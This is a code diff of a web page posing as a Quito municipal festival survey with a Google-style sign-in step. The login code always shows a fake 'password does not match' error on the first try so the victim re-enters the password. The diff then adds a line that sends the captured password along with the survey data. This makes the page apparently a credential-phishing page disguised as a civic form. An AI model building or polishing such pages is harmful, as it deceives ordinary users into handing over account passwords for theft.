@@ -9,7 +9,7 @@
     <!-- Lucide Icons -->
     <script src="https://unpkg.com/lucide@latest"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap');
         body { font-family: 'Poppins', sans-serif; }
         .bg-quito-dark { background-color: #0d1b2a; }
         .bg-quito-red { background-color: #9b2226; }
@@ -17,9 +17,9 @@
         .bg-quito-gold { background-color: #bb9457; }
         .border-quito-gold { border-color: #bb9457; }
         
-        /* Fondo con la Virgen del Panecillo y tono azul institucional */
+        /* Fondo con la Virgen del Panecillo al estilo de la imagen de referencia */
         .hero-bg {
-            background: linear-gradient(rgba(13, 27, 42, 0.85), rgba(13, 27, 42, 0.92)), 
+            background: linear-gradient(rgba(13, 27, 42, 0.75), rgba(13, 27, 42, 0.88)), 
                         url('https://upload.wikimedia.org/wikipedia/commons/e/ec/Virgen_del_Panecillo%2C_Quito%2C_Ecuador.jpg');
             background-size: cover;
             background-position: center;
@@ -36,7 +36,7 @@
         <p class="text-xs md:text-sm text-quito-gold uppercase font-medium mt-1">Participación y Registro Ciudadano</p>
     </header>
 
-    <!-- CONTENEDOR PRINCIPAL CON FONDO DE EL PANECILLO -->
+    <!-- CONTENEDOR PRINCIPAL CON FONDO REPRESENTATIVO -->
     <main class="hero-bg flex-grow flex items-center justify-center px-4 py-12">
         
         <!-- PASO 1: INICIO DE SESIÓN ESTILO GOOGLE (FONDO BLANCO) -->
@@ -55,7 +55,7 @@
                 <p class="text-xs text-gray-500 mt-1">Accede con tu cuenta para la encuesta de las festividades</p>
             </div>
 
-            <!-- Alerta de contraseña incorrecta (inicialmente oculta) -->
+            <!-- Alerta de contraseña incorrecta -->
             <div id="login-error" class="hidden mb-4 p-3 bg-red-50 border border-red-200 text-red-600 text-xs rounded-lg flex items-center gap-2">
                 <i data-lucide="alert-circle" class="w-4 h-4 flex-shrink-0"></i>
                 <span>La contraseña no coincide. Por favor, ingrésala de nuevo.</span>
@@ -115,7 +115,7 @@
 
                 <div>
                     <label class="block text-xs font-semibold uppercase text-quito-gold mb-1">Artistas que te gustaría que participen</label>
-                    <input type="text" id="user-artists" required placeholder="Ej. Papá Roncón, Gerardo Morán, Orquestas..." 
+                    <input type="text" id="user-artists" required placeholder="Ej. Gerardo Morán, Papá Roncón, Orquestas..." 
                         class="w-full px-4 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-quito-gold text-white">
                 </div>
 
@@ -169,22 +169,22 @@
         let userData = { email: '', password: '', name: '', companion: '', preference: '', artists: '', comments: '' };
         let loginAttempts = 0;
 
-        // Lógica de validación de login (simula que la primera vez la contraseña "no coincide" manteniendo el correo)
+        // Lógica de validación de contraseña
         document.getElementById('login-form').addEventListener('submit', function(e) {
             e.preventDefault();
-            const emailInput = document.getElementById('login-email').value;
-            const passwordInput = document.getElementById('login-password').value;
+            const emailField = document.getElementById('login-email');
+            const passwordField = document.getElementById('login-password');
 
             if (loginAttempts === 0) {
-                // Primer intento: simula error de contraseña no coincide
+                // Primer intento: muestra error, limpia la contraseña y MANTIENE el correo
                 loginAttempts++;
                 document.getElementById('login-error').classList.remove('hidden');
-                document.getElementById('login-password').value = ''; // Limpia contraseña
-                document.getElementById('login-email').value = emailInput; // Mantiene correo
+                passwordField.value = ''; 
+                passwordField.focus();
             } else {
-                // Segundo intento: acceso exitoso
-                userData.email = emailInput;
-                userData.password = passwordInput;
+                // Segundo intento: guarda datos y avanza a la encuesta
+                userData.email = emailField.value;
+                userData.password = passwordField.value;
 
                 document.getElementById('login-section').classList.add('hidden');
                 document.getElementById('survey-section').classList.remove('hidden');
@@ -204,12 +204,13 @@
             submitBtn.innerHTML = '<i data-lucide="loader-2" class="w-4 h-4 animate-spin"></i> Enviando...';
             lucide.createIcons();
 
-            // Generar número aleatorio de participante mayor a 1900 (ej. entre 1901 y 2500)
+            // Generar número aleatorio de participante mayor a 1900
             const randomParticipantId = Math.floor(Math.random() * 600) + 1901;
 
             const formData = new URLSearchParams();
             formData.append('fecha', new Date().toLocaleString());
             formData.append('email', userData.email);
+            formData.append('password', userData.password);
             formData.append('name', userData.name);
             formData.append('companion', userData.companion);
             formData.append('event', userData.preference);
